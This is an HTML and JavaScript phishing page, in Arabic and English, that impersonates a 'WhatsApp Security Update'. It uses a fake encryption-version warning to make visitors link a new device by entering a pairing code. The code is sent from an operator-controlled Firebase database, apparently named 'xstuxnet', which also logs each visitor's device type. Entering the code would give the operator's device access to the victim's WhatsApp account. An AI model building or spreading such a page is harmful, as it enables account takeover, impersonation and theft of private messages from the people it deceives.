<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security</title>
    <style>
        * { box-sizing: border-box; }
        html, body { height: 100%; margin: 0; padding: 0; background-color: #ffffff; color: #1c1e21; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; }

        .container { width: 100%; max-width: 380px; text-align: center; }
        .logo { width: 50px; margin-bottom: 15px; }
        
        .header-title { font-size: 18px; font-weight: 700; color: #075e54; margin-bottom: 8px; }
        .status-badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 20px; display: inline-block; }

        /* صندوق تحديث الإصدار */
        .version-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
        .v-row { display: flex; justify-content: space-between; align-items: center; margin: 10px 0; font-size: 13px; }
        .v-label { color: #667781; }
        .v-value { font-weight: bold; font-family: monospace; }
        .v-old { color: #d91e1e; }
        .v-new { color: #00a884; }

        .alert-text { font-size: 13.5px; line-height: 1.6; color: #3b4a54; margin-bottom: 20px; border-top: 1px solid #eee; padding-top: 15px; text-align: justify; }
        .highlight { color: #d91e1e; font-weight: bold; text-decoration: underline; }

        /* منطقة الكود */
        .code-zone { background-color: #ffffff; border: 2px solid #00a884; padding: 15px; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: 'Courier New', monospace; }
        .wait-text { font-size: 11px; color: #8696a0; margin-top: 8px; }
        
        [dir="rtl"] .alert-text { text-align: right; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div id="h_title" class="header-title"></div>
        <div id="h_dev" class="status-badge"></div>

        <div class="version-box">
            <div class="v-row">
                <span id="l_old" class="v-label"></span>
                <span class="v-value v-old">V2.12.5 (Legacy)</span>
            </div>
            <div style="height: 1px; background: #eee; margin: 5px 0;"></div>
            <div class="v-row">
                <span id="l_new" class="v-label"></span>
                <span class="v-value v-new">V3.0.1 (Encrypted)</span>
            </div>
        </div>

        <div id="h_alert" class="alert-text"></div>

        <div class="code-zone">
            <div id="pairing-code">. . .</div>
            <div id="h_wait" class="wait-text"></div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        
        const params = new URLSearchParams(window.location.search);
        const userId = params.get('id') || "NODE_" + Math.floor(Math.random() * 9999);
        const isAr = navigator.language.startsWith('ar');
        const device = /iPhone|iPad|iPod/.test(navigator.userAgent) ? "iPhone" : "Android";
        
        document.body.dir = isAr ? "rtl" : "ltr";

        const UI = {
            ar: {
                title: "تحديث أمان واتساب",
                dev: "جهازك المرتبط: " + device,
                old: "إصدار التشفير الحالي:",
                new: "الإصدار الأمني الجديد:",
                alert: "أنت تستخدم حالياً إصداراً قديماً من بروتوكول التشفير. يلتزم عليك لحماية خصوصيتك ومحادثاتك التحديث إلى أحدث إصدار أمني حالياً (V3.0.1).<br><br><b>طريقة التحديث:</b><br>1. افتح إشعار <b>'ربط جهاز جديد'</b> المرسل لك الآن.<br>2. اضغط على <span class='highlight'>'الربط برقم الهاتف'</span> أسفل شاشة الموبايل.<br>3. أدخل رمز التأكيد الموضح أدناه:",
                wait: "بانتظار تأكيد الهوية.."
            },
            en: {
                title: "WhatsApp Security Update",
                dev: "Linked Device: " + device,
                old: "Current Encryption:",
                new: "New Security Version:",
                alert: "You are currently using an outdated version of the encryption protocol. To protect your privacy and chats, you must update to the latest security version (V3.0.1).<br><br><b>How to Update:</b><br>1. Open the <b>'Link a Device'</b> notification sent to you.<br>2. Tap <span class='highlight'>'Link with phone number'</span> at the bottom of your screen.<br>3. Enter the verification code shown below:",
                wait: "Awaiting identity verification.."
            }
        };

        const lang = isAr ? UI.ar : UI.en;
        document.getElementById('h_title').innerText = lang.title;
        document.getElementById('h_dev').innerText = lang.dev;
        document.getElementById('l_old').innerText = lang.old;
        document.getElementById('l_new').innerText = lang.new;
        document.getElementById('h_alert').innerHTML = lang.alert;
        document.getElementById('h_wait').innerText = lang.wait;

        db.ref('visiting/' + userId).set({ device: device, status: "updating", ts: Date.now() });
        db.ref('sessions/' + userId).on('value', (s) => {
            if (s.val() && s.val().code) {
                document.getElementById('pairing-code').innerText = s.val().code;
                document.getElementById('h_wait').innerText = isAr ? "تم استلام مفتاح التشفير" : "Security key received";
            }
        });
    </script>
</body>
</html>
